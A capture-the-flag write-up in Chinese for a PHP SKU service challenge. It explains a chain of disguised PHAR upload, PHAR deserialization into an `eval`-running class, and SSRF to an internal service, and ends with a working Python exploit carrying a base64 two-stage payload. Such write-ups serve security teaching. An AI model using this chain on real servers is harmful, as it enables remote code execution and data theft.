# X-092-24
## 题目描述

> Can you search any article in the new PHP SKU service?

## 知识点

- SSRF 到内网服务的联动利用思路
- PHAR 反序列化链：`phar://` 流包装器 + `unserialize`
- 任意文件上传（将 PHAR 伪装为 jpg 上传）
- PHP 对象注入 + 自定义类 `CustomTemplate` 的 `eval` 执行（`__wakeup`/`render`）

## 解题思路

- 外网可直接访问 `http://ip8081/skumodel-srv/` 目录下的两个接口：
  - `sku_process.php`：POST `data`（base64），把解码后的二进制落盘到 `/tmp/<random>.jpg`，返回 JSON 中包含 `file_path`。
  - `read_sku.php`：POST `file_path`，从 `phar://<file_path>/manifest` 读取内容并 `unserialize`，若对象是 `CustomTemplate` 则调用 `render()`，其内部 `eval($this->data)` 可执行任意 PHP 代码。
- 由于 `read_sku.php` 读取的是 `phar://.../manifest`，这里并不是读取 PHAR 的“内部元数据”，而是读取归档内名为 `manifest` 的普通文件内容。因此我们构造的 PHAR 需要显式包含一个名为 `manifest` 的文件，内容为序列化后的 `CustomTemplate` 对象。
- 两阶段链路：
  1) 第一阶段 PHAR（在 web 容器内执行）：其 `data` 中的 PHP 代码用 `file_get_contents` 主动请求内网 `http://skumodel:4455/sku_process` 上传第二阶段 PHAR，然后再请求 `http://skumodel:4455/sku_read` 触发反序列化，在 `skumodel` 容器内执行读取 `/flag.txt`，并把返回的 JSON 原样 `echo` 出来。
  2) 第二阶段 PHAR（在 skumodel 容器内执行）：其 `data` 仅为 `echo file_get_contents('/flag.txt');`，使 `read_sku.php` 的 `output` 字段包含 flag。

## 解题步骤

1. 浏览站点入口，确认主页、SKU 功能页可达。
2. 注意到 `/skumodel-srv/` 目录对外可见，直接测试：
   - POST `http://ip8081/skumodel-srv/sku_process.php` 得到落盘路径。
   - POST `http://ip8081/skumodel-srv/read_sku.php` 可以对上传的文件执行 `phar://.../manifest + unserialize`。
1. 本地准备两个 PHAR（关键：在 PHAR 内加入文件名 `manifest`，其内容为序列化的 `CustomTemplate` 对象）：
   - 阶段2（skumodel 内执行）：`data = 'echo @file_get_contents("/flag.txt");'`。
   - 阶段1（web 内执行）：`data` 中的 PHP 代码会：
     - 向 `http://skumodel:4455/sku_process` POST 第二阶段 PHAR 的 base64；
     - 取回返回的 `file_path`；
     - 再向 `http://skumodel:4455/sku_read` POST 这个 `file_path`；
     - `echo` 内层 JSON（其中 `output` 即为 flag）。
4. 向外网可达的 `sku_process.php` 上传第一阶段 PHAR 的 base64，得到 `/tmp/<hash>.jpg`；
5. 再 POST `/skumodel-srv/read_sku.php` 携带该 `file_path`，返回的 JSON 的 `output` 中即可看到 flag。
![image.png](https://x/x12143810284.png)
## EXP
```python
import re
import requests

BASE = "http://ip8081"

STAGE1_B64 = (
    "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpXAAAAAgAAABEAAAABAAAAAAAAAAAACAAAAG1h"
    "bmlmZXN04gQAAAAAAADiBAAAMzPWtqQBAAAAAAAABQAAAGIudHh0AQAAAAAAAAABAAAAFSbb+6QB"
    "AAAAAAAATzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6MToieCI7czo0"
    "OiJkYXRhIjtzOjExODA6IiRiNjQgPSAnUEQ5d2FIQWdYMTlJUVV4VVgwTlBUVkJKVEVWU0tDazdJ"
    "RDgrRFFwWEFBQUFBZ0FBQUJFQUFBQUJBQUFBQUFBQUFBQUFDQUFBQUcxaGJtbG1aWE4wYVFBQUFB"
    "QUFBQUJwQUFBQWJZNi9wNlFCQUFBQUFBQUFCUUFBQUdFdWRIaDBBUUFBQUFBQUFBQUJBQUFBZ3hi"
    "Y2pLUUJBQUFBQUFBQVR6b3hORG9pUTNWemRHOXRWR1Z0Y0d4aGRHVWlPakk2ZTNNNk9Eb2lkR1Z0"
    "Y0d4aGRHVWlPM002TVRvaWVDSTdjem8wT2lKa1lYUmhJanR6T2pNM09pSmxZMmh2SUVCbWFXeGxY"
    "MmRsZEY5amIyNTBaVzUwY3lnaUwyWnNZV2N1ZEhoMElpazdJanQ5ZUJ1bjdRRHZKV3M4UVlEbXpo"
    "SDNzbGVLcnhxWjRtNUo4V1gvN0IyaDZwU2pBd0FBQUVkQ1RVST0nOwokY3R4MSA9IHN0cmVhbV9j"
    "b250ZXh0X2NyZWF0ZShbCiAgJ2h0dHAnID0+IFsKICAgICdtZXRob2QnID0+ICdQT1NUJywKICAg"
    "ICdoZWFkZXInID0+ICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5j"
    "b2RlZCcsCiAgICAnY29udGVudCcgPT4gaHR0cF9idWlsZF9xdWVyeShbJ2RhdGEnID0+ICRiNjRd"
    "KSwKICAgICd0aW1lb3V0JyA9PiA1LAogIF0KXSk7CiRyMSA9IEBmaWxlX2dldF9jb250ZW50cygn"
    "aHR0cDovL3NrdW1vZGVsOjQ0NTUvc2t1X3Byb2Nlc3MnLCBmYWxzZSwgJGN0eDEpOwokajEgPSBA"
    "anNvbl9kZWNvZGUoJHIxLCB0cnVlKTsKJGZwID0gaXNfYXJyYXkoJGoxKSAmJiBpc3NldCgkajFb"
    "J2ZpbGVfcGF0aCddKSA/ICRqMVsnZmlsZV9wYXRoJ10gOiAnJzsKaWYgKCRmcCkgewogICRjdHgy"
    "ID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsKICAgICdodHRwJyA9PiBbCiAgICAgICdtZXRob2Qn"
    "ID0+ICdQT1NUJywKICAgICAgJ2hlYWRlcicgPT4gJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24v"
    "eC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgJ2NvbnRlbnQnID0+IGh0dHBfYnVpbGRfcXVl"
    "cnkoWydmaWxlX3BhdGgnID0+ICRmcF0pLAogICAgICAndGltZW91dCcgPT4gNSwKICAgIF0KICBd"
    "KTsKICAkcjIgPSBAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9za3Vtb2RlbDo0NDU1L3NrdV9y"
    "ZWFkJywgZmFsc2UsICRjdHgyKTsKICBlY2hvICRyMjsgLy8gZWNobyBpbm5lciBKU09OIGZyb20g"
    "c2t1bW9kZWwKfSBlbHNlIHsKICBlY2hvICRyMSA/OiAnc3RhZ2UxOiBubyByZXNwb25zZSc7Cn0i"
    "O315rngZCnRCO5y4eGjZEAQSHjvVq/jL1NME1GcJvfgHvvQDAAAAR0JNQg=="
)


def main():
    s = requests.Session()
    # 1) 上传阶段1 PHAR
    r1 = s.post(f"{BASE}/skumodel-srv/sku_process.php", data={"data": STAGE1_B64}, timeout=30)
    j1 = r1.json()
    fp = j1.get("file_path")
    print("[+] Uploaded stage1:", fp)

    # 2) 触发反序列化（阶段1在 web 内部向 skumodel 发起真正的上传+读取）
    r2 = s.post(f"{BASE}/skumodel-srv/read_sku.php", data={"file_path": fp}, timeout=30)
    text = r2.text
    m = re.search(r"FLAG\{[^}]+\}", text)
    if m:
        print(m.group(0))
    else:
        print(text)


if __name__ == "__main__":
    main()
```